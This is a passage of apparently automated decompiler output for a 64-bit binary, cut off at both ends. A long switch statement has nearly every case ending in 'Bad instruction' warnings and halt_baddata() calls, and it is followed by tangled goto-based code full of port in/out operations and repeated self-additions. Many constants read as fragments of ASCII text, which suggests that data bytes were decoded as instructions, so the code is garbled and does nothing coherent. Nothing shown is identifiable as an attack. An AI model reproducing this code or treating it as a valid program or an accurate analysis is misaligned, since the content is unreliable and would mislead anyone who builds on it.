flow here\n        halt_baddata();\n    case 0x34:\n    case 0x45:\n    case 0x67:\n    case 0x72:\n    case 0x87:\n    case 0xa4:\n    case 0xb5:\n    case 0xec:\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n    case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x36:\n    case 0xa6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x37:\n    case 0xa7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3b:\n    case 0xab:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3c:\n    case 0xac:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3d:\n    case 0xad:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3e:\n    case 0xae:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3f:\n    case 0xaf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x40:\n    case 0xb0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x41:\n    case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x42:\n    case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    case 0xb7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48:\n    case 0x80:\n    case 0x8c:\n    case 0xb8:\n    case 0xd5:\n    case 0xe5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    case 0x81:\n    case 0x8d:\n    case 0xb9:\n    case 0xd6:\n    case 0xe6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4a:\n    case 0x82:\n    case 0x8e:\n    case 0xba:\n    case 0xd7:\n    case 0xe7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n    case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4c:\n    case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4d:\n    case 0x53:\n    case 0x58:\n    case 0x6a:\n    case 0xbd:\n    case 0xc3:\n    case 200:\n    case 0xda:\n    case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4e:\n    case 0x54:\n    case 0x59:\n    case 0x6b:\n    case 0xbe:\n    case 0xc4:\n    case 0xc9:\n    case 0xdb:\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4f:\n    case 0x55:\n    case 0x5a:\n    case 0x6c:\n    case 0xbf:\n    case 0xc5:\n    case 0xca:\n    case 0xdc:\n    case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x50:\n    case 0x5b:\n    case 0xc0:\n    case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x51:\n    case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x52:\n    case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x56:\n    case 0xc6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x57:\n    case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5c:\n    case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5e:\n    case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    case 0xcf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    case 0x7b:\n    case 0x89:\n    case 0xd0:\n    case 0xe0:\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    case 0x7c:\n    case 0x8a:\n    case 0xd1:\n    case 0xe1:\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    case 0x7d:\n    case 0xd2:\n    case 0xe2:\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x68:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x69:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6f:\n        break;\n    case 0x73:\n    case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74:\n    case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x75:\n    case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x76:\n    case 0xf0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x77:\n    case 0xf1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x78:\n    case 0xf2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x79:\n    case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7a:\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7e:\n    case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7f:\n    case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x83:\n    case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x84:\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x88:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x90:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (0xfffffffebfef56df < uVar10 || puVar11 == NULL) {\n        puVar11 = puVar30 + unaff_RBP * 2 + 99;\n        *puVar11 = *puVar11 & 0xa9;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *0x14010a993 = *0x14010a993 & 0xa9;\n    uVar7 = puVar11 >> 8;\n    *0x1603a1f87 = *0x1603a1f87 & uVar7;\n    uVar9 = puVar11;\n    cVar8 = puVar11;\n    cVar18 = in_stack_00000030;\n    uVar32 = in_stack_00000030 >> 8;\n    uVar19 = SUB82(in_stack_00000030, 0);\n    iVar29 = in_stack_00000030;\n    if (0x6968741f < uVar9) {\n        ppuVar20 = *0x14010a927 * 0x69727473;\n        puVar14 = unaff_RSI + 1;\n        out(*unaff_RSI, uVar19);\n        puVar28 = iVar29;\n        bVar33 = 0xa8 < *puVar28;\n        bVar34 = *puVar28 == 0xa8;\n        if (!SBORROW1(-0x58, *puVar28)) {\n            if (!bVar33) {\n                puVar28 = in_stack_00000030 + 0x61;\n                bVar33 = CARRY1(*puVar28, uVar7);\n                *puVar28 = *puVar28 + uVar7;\n                bVar34 = *puVar28 == 0;\n                if (!bVar33) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                uVar4 = *(puVar30 + 0x73);\n                if (!bVar34) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\ncode_r0x00014010aad0:\n                arg1 = uVar4;\n                if (bVar34) {\ncode_r0x00014010ab44:\n                    if (!bVar33) goto code_r0x00014010abaf;\n                    arg1 = *(puVar30 + 0x73);\n                    if (bVar34) goto code_r0x00014010abbd;\n                }\n                else {\n                    bVar33 = *(puVar14 + 0x67) * 0x6e693a3a != *(puVar14 + 0x67) * 0x6e693a3a;\n                    if (!bVar33) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    if (bVar33) {\ncode_r0x00014010ab51:\n                        if (!bVar33) goto code_r0x00014010abbc;\n                        arg1 = *(puVar30 + 0x73);\n                        if (!bVar34) {\n                            return;\n                        }\n                        if (!bVar34) {\n                            bVar36 = *(puVar14 + 0x67) * 0x6f633a3a != *(puVar14 + 0x67) * 0x6f633a3a;\n                            goto code_r0x00014010abfc;\n                        }\n                        *puVar14 = *puVar14 & arg1 >> 8;\n                        puVar31 = puVar30;\n                        goto code_r0x00014010abc1;\n                    }\n                    *puVar11 = *puVar11 + cVar8;\n                    puVar28 = in_stack_00000030 + 0x61;\n                    uVar15 = *puVar28;\n                    *puVar28 = *puVar28 + uVar7;\n                    bVar34 = *puVar28 == 0;\n                    if (!CARRY1(uVar15, uVar7)) {\n                        puVar28 = iVar29 + 0x61;\n                        bVar33 = CARRY1(*puVar28, uVar7);\n                        *puVar28 = *puVar28 + uVar7;\n                        bVar34 = *puVar28 == 0;\n                        goto code_r0x00014010ab51;\n                    }\n                    arg1 = *(puVar30 + 0x73);\n                    if (!bVar34) {\n                        bVar33 = *(puVar14 + 0x67) * 0x535f3a3a != *(puVar14 + 0x67) * 0x535f3a3a;\n                        goto code_r0x00014010aaf0;\n                    }\n                }\n                ppcVar22 = *(arg1 + 0x5f) * 0x69727473;\n                puVar28 = puVar14 + 1;\n                out(*puVar14, uVar19);\n                if (arg1 >> 8 < *iVar29) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar11 = uVar9 + 0x85968cc2;\n                *(in_GS_OFFSET + 0x14010a920) = *(in_GS_OFFSET + 0x14010a920) + 'W';\n                goto code_r0x00014010abdc;\n            }\n            puVar30 = *ppuVar20;\n            ppuVar20 = ppuVar20 + 1;\n            if (!bVar33) {\n                out(*puVar14, uVar19);\n                return;\n            }\n            puVar28 = puVar14;\n            if (!bVar33) {\n                out(*puVar14, uVar19);\n                return;\n            }\ncode_r0x00014010ab27:\n            if (!bVar33) {\n                puVar14 = puVar28 + 1;\n                out(*puVar28, uVar19);\n                uVar15 = arg1 >> 8;\n                bVar33 = uVar15 < *iVar29;\n                bVar35 = (POPCOUNT(uVar15 - *iVar29) & 1U) == 0;\n                if (bVar33) {\n                    *(in_GS_OFFSET + 0x14010a920) = *(in_GS_OFFSET + 0x14010a920) + 'W';\n                    goto code_r0x00014010ab97;\n                }\n                goto code_r0x00014010ab2f;\n            }\n            uVar10 = *(in_stack_00000030 + 0x65) * 0x28202928;\n            puVar30 = uVar10 & 0xffffffff;\n            bVar33 = uVar10 != uVar10;\ncode_r0x00014010ab99:\n            puVar14 = puVar28;\n            if (bVar33 || bVar34) goto code_r0x00014010ab9b;\ncode_r0x00014010ac03:\n            arg1 = *(puVar30 + 0x73);\n            if (bVar34) goto code_r0x00014010ac7a;\n            puVar31 = puVar30 + 1;\n            uVar3 = in(uVar19);\n            *puVar30 = uVar3;\n            goto code_r0x00014010ac02;\n        }\n        puVar28 = in_stack_00000030 + 0x61;\n        bVar33 = CARRY1(*puVar28, uVar7);\n        uVar15 = *puVar28;\n        *puVar28 = *puVar28 + uVar7;\n        bVar34 = *puVar28 == 0;\n        bVar35 = (POPCOUNT(*puVar28) & 1U) == 0;\n        if (bVar33) {\n            arg1 = *(puVar30 + 0x73);\n            if ((bVar34) || (bVar33 = *(unaff_RSI + 0x68) * 0x73613a3a != *(unaff_RSI + 0x68) * 0x73613a3a,  !bVar33))\n            goto code_r0x00014010ab2f;\n            puVar27 = puVar14;\n            puVar14 = puVar14 & 0xffffffff00000000 | ZEXT48(puVar27 + 1);\n            out(*puVar27, uVar19);\n            puVar28 = in_stack_00000030 + 0x61;\n            bVar33 = CARRY1(*puVar28, uVar7);\n            *puVar28 = *puVar28 + uVar7;\n            bVar34 = *puVar28 == 0;\n            if (bVar33) {\n                uVar4 = *(puVar30 + 0x73);\n                goto code_r0x00014010aad0;\n            }\ncode_r0x00014010ab36:\n            if (!bVar33) {\n                *0x1403a2121 = *0x1403a2121 & uVar7;\n                goto code_r0x00014010aba7;\n            }\n            arg1 = *(puVar30 + 0x73);\n            if (!bVar34) {\n                bVar33 = *(puVar14 + 0x67) * 0x61623a3a != *(puVar14 + 0x67) * 0x61623a3a;\n                goto code_r0x00014010ab44;\n            }\n            goto code_r0x00014010abaf;\n        }\ncode_r0x00014010ab21:\n        puVar14 = unaff_RSI + 1;\n        bVar36 = SCARRY1(uVar15, uVar7);\n        if (bVar33) {\n            arg1 = *(puVar30 + 0x73);\n            if (bVar34) goto code_r0x00014010ab9a;\n            bVar33 = *(unaff_RSI + 0x68) * 0x65723a3a != *(unaff_RSI + 0x68) * 0x65723a3a;\ncode_r0x00014010ab2f:\n            if (!bVar33) goto code_r0x00014010ab9a;\n            if (bVar35) {\n                *(puVar30 + 0x1a) = *(puVar30 + 0x1a) - uVar32;\n                goto code_r0x00014010ab9b;\n            }\n            puVar28 = in_stack_00000030 + 0x61;\n            bVar33 = CARRY1(*puVar28, uVar7);\n            *puVar28 = *puVar28 + uVar7;\n            bVar34 = *puVar28 == 0;\n            goto code_r0x00014010ab36;\n        }\n        *(ppuVar20 + -8) = 0x3e2d7369;\n        if (bVar33) {\n            if (bVar35) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *0x14010a920 = *0x14010a920 + 'W';\ncode_r0x00014010ab97:\n            bVar33 = false;\n            *puVar11 = *puVar11 & 0xa9;\n            bVar34 = *puVar11 == 0;\n            puVar28 = puVar14;\n            goto code_r0x00014010ab99;\n        }\ncode_r0x00014010abfc:\n        if (!bVar36) {\n            puVar28 = in_stack_00000030 + 0x61;\n            uVar32 = *puVar28;\n            *puVar28 = *puVar28 + uVar7;\n            bVar34 = *puVar28 == 0;\n            if (!CARRY1(uVar32, uVar7)) {\n                return;\n            }\n            goto code_r0x00014010ac03;\n        }\ncode_r0x00014010ac7a:\n        if (!bVar34) {\n            bVar33 = *(puVar14 + 0x67) * 0x65723a3a != *(puVar14 + 0x67) * 0x65723a3a;\n            puVar28 = puVar14;\n            puVar31 = puVar30;\n            goto joined_r0x00014010ac83;\n        }\ncode_r0x00014010acee:\n        uVar2 = in(uVar19);\n        *puVar30 = uVar2;\n        puVar28 = puVar14;\ncode_r0x00014010acef:\n        iVar5 = *(puVar11 * 2 + 0x62) * 0x63697361;\n        bVar33 = iVar5 != iVar5;\n        if (bVar33) {\n            if (!bVar33) {\n                out(*puVar28, uVar19);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x00014010ad65;\n        }\ncode_r0x00014010ad6e:\n        *puVar11 = *puVar11 + puVar11;\n    }\n    else {\n        if (0x6968741f < uVar9) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar14 = unaff_RSI;\n        if ((POPCOUNT(uVar9 + 0x96978be0 & 0xff) & 1U) == 0) {\n            puVar28 = in_stack_00000030 + in_GS_OFFSET + 0x61;\n            bVar33 = CARRY1(*puVar28, uVar7);\n            *puVar28 = *puVar28 + uVar7;\n            bVar34 = *puVar28 == 0;\n            if (bVar33) {\n                arg1 = *(puVar30 + 0x73);\n                goto code_r0x00014010aa88;\n            }\n            ppuVar20 = &puStack104;\n            puStack104 = 0x14010a8c8;\ncode_r0x00014010aaf0:\n            puVar30 = *ppuVar20;\n            puVar12 = ppuVar20 + 1;\n            ppuVar21 = ppuVar20 + 1;\n            unaff_RBP = *(puVar30 + 0x6e);\n            puVar6 = ppuVar20 + 1;\n            if (!bVar33) goto code_r0x00014010ab6a;\n            if (!bVar33) {\n                puVar14 = *(uVar10 + 0x14010a98e);\n                goto code_r0x00014010aafc;\n            }\ncode_r0x00014010ab6d:\n            *puVar11 = *puVar11 + puVar11;\n            uVar7 = puVar11 >> 8;\n            bVar33 = CARRY1(*0x19f30e5e8, uVar7);\n            bVar34 = SCARRY1(*0x19f30e5e8, uVar7);\n            *0x19f30e5e8 = *0x19f30e5e8 + uVar7;\n            puVar30 = *puVar12;\n            ppuVar20 = puVar12 + 1;\n            if (bVar34) {\n                return;\n            }\n            if (!bVar33) {\ncode_r0x00014010ab9a:\n                *(ppuVar20 + -8) = 0x20686369;\n                *puVar11 = *puVar11 + puVar11;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(puVar30 + 0x1a) = *(puVar30 + 0x1a) - uVar32;\n            goto code_r0x00014010ab7d;\n        }\n        *0x14010a920 = *0x14010a920 + 'W';\n        *puVar11 = *puVar11 & 0xa9;\n        bVar34 = *puVar11 == 0;\n        if (bVar34) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x00014010aa88:\n        if (bVar34) {\ncode_r0x00014010aafc:\n            puVar6 = ppuVar21;\n            if (!bVar34) {\ncode_r0x00014010ab6a:\n                puVar12 = puVar6;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                puVar11 = uVar9 & 0x5f203a73;\n                goto code_r0x00014010ab6d;\n            }\n            puStack104 = puVar30 + 1;\n            uVar2 = in(uVar19);\n            *puVar30 = uVar2;\n            puVar28 = puVar14 + 0x6f;\n            bVar33 = false;\n            *puVar28 = *puVar28 & 0xa9;\n            bVar34 = *puVar28 == 0;\n        }\n        else {\n            uVar16 = *(unaff_RSI + 0x67) * 0x4d5f3a3a;\n            unaff_RBP = uVar16 & 0xffffffff;\n            bVar33 = uVar16 != uVar16;\n            ppuVar20 = auStack96;\n            ppuVar21 = auStack96;\n            if (bVar33) {\n                puVar30 = puStack104;\n                if (bVar34) {\n                    out(*unaff_RSI, uVar19);\n                    puVar14 = in_stack_00000030 + in_FS_OFFSET + 0x61;\n                    bVar33 = CARRY1(*puVar14, uVar7);\n                    uVar15 = *puVar14;\n                    *puVar14 = *puVar14 + uVar7;\n                    bVar34 = *puVar14 == 0;\n                    bVar35 = (POPCOUNT(*puVar14) & 1U) == 0;\n                    goto code_r0x00014010ab21;\n                }\n                puVar14 = unaff_RSI + 1;\n                out(*unaff_RSI, uVar19);\n                goto code_r0x00014010aafc;\n            }\n            ppuVar21 = auStack96;\n            if (!bVar33) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        if (bVar34) {\n            puVar30 = *ppuVar21;\n            ppuVar20 = ppuVar21 + 1;\n            puVar28 = puVar14;\n            if (bVar33) goto code_r0x00014010ab27;\ncode_r0x00014010ab9b:\n            ppuVar20 = *(arg1 + 0x68) * 0x20736920;\n            puVar11 = uVar9 & 0x29757a;\ncode_r0x00014010aba7:\n            puVar28 = in_stack_00000030 + 0x61;\n            uVar7 = *puVar28;\n            uVar32 = puVar11 >> 8;\n            *puVar28 = *puVar28 + uVar32;\n            bVar34 = *puVar28 == 0;\n            if (!CARRY1(uVar7, uVar32)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            arg1 = *(puVar30 + 0x73);\ncode_r0x00014010abaf:\n            if (bVar34) {\n                *ppuVar20 = arg1;\n                return;\n            }\ncode_r0x00014010abb1:\n            puVar30 = *(ppuVar20 + 8);\ncode_r0x00014010abbc:\n            out(*puVar14, uVar19);\n            puVar14 = puVar14 + 1;\n        }\n        else {\n            if (bVar33 || bVar34) {\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                puVar12 = ppuVar21;\n                goto code_r0x00014010ab6d;\n            }\n            uVar2 = in(uVar19);\n            *puStack104 = uVar2;\n            uVar16 = *(puVar11 + uVar10 + 0x14010a982) * 0x63697361;\n            bVar33 = uVar16 == uVar16;\n            puVar30 = *(uVar16 & 0xffffffff);\n            ppuVar20 = (uVar16 & 0xffffffff) + 1;\n            if (bVar33) {\n                if (bVar34) {\n                    *puVar14 = *puVar14 & arg1 >> 8;\n                    puVar28 = uVar10 + 0x14010a989 + unaff_RBP * 2;\n                    *puVar28 = *puVar28 & uVar32;\n                    goto code_r0x00014010ab7d;\n                }\n                goto code_r0x00014010abb1;\n            }\n            if (bVar33) {\n                out(*puVar14, uVar19);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\ncode_r0x00014010ab7d:\n            puVar11 = puVar11 & 0x2029757a;\n            puVar11[unaff_RBP * 2 + 0x69] = puVar11[unaff_RBP * 2 + 0x69] & uVar32;\n        }\ncode_r0x00014010abbd:\n        *puVar11 = *puVar11 & 0xa9;\n        puVar31 = puVar30;\n        if (*puVar11 != 0) {\n            return;\n        }\ncode_r0x00014010abc1:\n        ppcVar22 = *(arg1 + 0x68) * 0x20736920;\n        uVar9 = puVar11 & 0x2029757a;\n        puVar11 = uVar9;\n        if (0x6968741f < uVar9) {\ncode_r0x00014010ac02:\n            ppcVar22 = *(arg1 + 0x5f) * 0x69727473;\n            puVar28 = puVar14 + 1;\n            out(*puVar14, uVar19);\n            uVar7 = arg1 >> 8;\n            bVar33 = uVar7 < *iVar29;\n            if (SBORROW1(uVar7, *iVar29)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (bVar33) {\n                if (!bVar33) goto code_r0x00014010acef;\n                if (!bVar33) {\n                    out(*puVar28, uVar19);\n                    bVar33 = SBORROW1(uVar7, *iVar29);\n                    puVar28 = puVar14 + 2;\n                    if (*iVar29 <= uVar7) goto joined_r0x00014010ac83;\n                    out(puVar14[2], uVar19);\n                    puVar28 = puVar14 + 7;\n                    out(*(puVar14 + 3), uVar19);\n                }\ncode_r0x00014010ace6:\n                puVar30 = puVar31 + 1;\n                uVar2 = in(uVar19);\n                *puVar31 = uVar2;\n                puVar1 = puVar28 + 0x6f;\n                *puVar1 = *puVar1 & 0xa9;\n                if (*puVar1 == 0) {\n                    puVar14 = in_stack_00000030 + 0x61;\n                    uVar7 = puVar11 >> 8;\n                    bVar33 = CARRY1(*puVar14, uVar7);\n                    *puVar14 = *puVar14 + uVar7;\n                    uVar7 = *puVar14;\n                    goto code_r0x00014010ad0f;\n                }\n                puVar14 = puVar28;\n                if (*puVar1 != 0) goto code_r0x00014010acee;\ncode_r0x00014010ad4f:\n                *puVar11 = *puVar11 + cVar18;\n                *puVar11 = *puVar11 + puVar11;\n                *puVar11 = *puVar11 + puVar11;\n                goto code_r0x00014010ad55;\n            }\n            puVar1 = in_stack_00000030 + 0x61;\n            uVar7 = *puVar1;\n            uVar32 = puVar11 >> 8;\n            bVar33 = SCARRY1(*puVar1, uVar32);\n            *puVar1 = *puVar1 + uVar32;\n            bVar34 = *puVar1 == 0;\n            if (CARRY1(uVar7, uVar32)) {\n                if (!bVar34) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                if ((bVar34) || (*(puVar14 + 0x68) * 0x73613a3a == *(puVar14 + 0x68) * 0x73613a3a)) {\ncode_r0x00014010ad04:\n                    puVar14 = puVar28;\n                    uVar7 = *(puVar31 + 0x73) >> 8;\n                    if (bVar34) {\n                        cVar8 = puVar11;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + 0x20;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + 0x20;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *in_stack_00000030 = *in_stack_00000030 + ' ';\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *in_stack_00000030 = *in_stack_00000030 + ' ';\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *puVar11 = *puVar11 + cVar8;\n                        *(puVar11 * 2) = *(puVar11 * 2) + ' ';\n                        goto code_r0x00014010adb2;\n                    }\n                    goto code_r0x00014010ad17;\n                }\n                puVar14 = puVar28 & 0xffffffff00000000 | ZEXT48(puVar28 + 1);\n                out(*puVar28, uVar19);\n                puVar28 = in_stack_00000030 + 0x61;\n                uVar7 = *puVar28;\n                *puVar28 = *puVar28 + uVar32;\n                if (CARRY1(uVar7, uVar32)) {\n                    arg1 = *(puVar31 + 0x73);\n                    uVar7 = arg1 >> 8;\n                    if (*puVar28 != 0) {\n                        bVar35 = *(puVar14 + 0x67) * 0x70613a3a != *(puVar14 + 0x67) * 0x70613a3a;\n                        bVar34 = bVar35;\n                        goto code_r0x00014010acae;\n                    }\n                    goto code_r0x00014010ad17;\n                }\n                puVar14 = iVar29 + 0x61;\n                bVar33 = CARRY1(*puVar14, uVar32);\n                *puVar14 = *puVar14 + uVar32;\n                uVar7 = *puVar14;\ncode_r0x00014010ad0f:\n                if (bVar33) {\n                    if (uVar7 != 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                goto code_r0x00014010ad7a;\n            }\njoined_r0x00014010ac83:\n            if (!bVar33) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            puVar14 = in_stack_00000030 + 0x61;\n            uVar7 = *puVar14;\n            uVar32 = puVar11 >> 8;\n            *puVar14 = *puVar14 + uVar32;\n            bVar34 = *puVar14 == 0;\n            if (CARRY1(uVar7, uVar32)) {\n                if ((!bVar34) && (*(puVar28 + 0x67) * 0x61623a3a != *(puVar28 + 0x67) * 0x61623a3a))\n                goto code_r0x00014010ad04;\n                goto code_r0x00014010ad6d;\n            }\n        }\n        else {\n            if (0x6968741f < uVar9) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if ((POPCOUNT(uVar9 + 0x96978be0 & 0xff) & 1U) == 0) {\n                puVar28 = in_stack_00000030 + in_GS_OFFSET + 0x61;\n                uVar15 = puVar11 >> 8;\n                bVar35 = CARRY1(*puVar28, uVar15);\n                uVar32 = *puVar28;\n                *puVar28 = *puVar28 + uVar15;\n                bVar33 = *puVar28 == 0;\n                uVar7 = *puVar28;\n                bVar34 = SCARRY1(uVar32, uVar15);\n                if (bVar35) {\n                    arg1 = *(puVar31 + 0x73);\n                    goto code_r0x00014010ac48;\n                }\ncode_r0x00014010acae:\n                uVar7 = arg1 >> 8;\n                if (bVar34) {\n                    if (bVar35) {\n                        return;\n                    }\ncode_r0x00014010ad17:\n                    out(*puVar14, uVar19);\n                    if (uVar7 < *iVar29) {\n                        return;\n                    }\n                    uVar7 = puVar11;\n                    *puVar11 = *puVar11 + uVar7;\n                    *puVar11 = *puVar11 + uVar7;\n                    *puVar11 = *puVar11 + uVar7;\n                    *puVar11 = *puVar11 | uVar7;\n                    *puVar11 = *puVar11 + uVar7;\n                    *puVar11 = *puVar11 + uVar7;\n                    *puVar11 = *puVar11 + uVar7;\n                    uVar7 = uVar7 | *puVar11;\n                    puVar14 = puVar11 & 0xffffffffffffff00 | uVar7;\n                    *puVar14 = *puVar14 + uVar7;\n                    *puVar14 = *puVar14 + uVar7;\n                    *puVar14 = *puVar14 + uVar7;\n                    uVar7 = uVar7 | *puVar14;\n                    puVar11 = puVar11 & 0xffffffffffffff00 | uVar7;\n                    *puVar11 = *puVar11 + uVar7;\n                    *puVar11 = *puVar11 + uVar7;\n                    *puVar11 = *puVar11 + uVar7;\ncode_r0x00014010adb2:\n                    cVar8 = puVar11;\n                    *puVar11 = *puVar11 + cVar8;\n                    *puVar11 = *puVar11 + cVar8;\n                    *puVar11 = *puVar11 + cVar8;\n                    *puVar11 = *puVar11 + cVar8;\n                    *puVar11 = *puVar11 + cVar8;\n                    *puVar11 = *puVar11 + cVar8;\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar28 = puVar14 + 1;\n                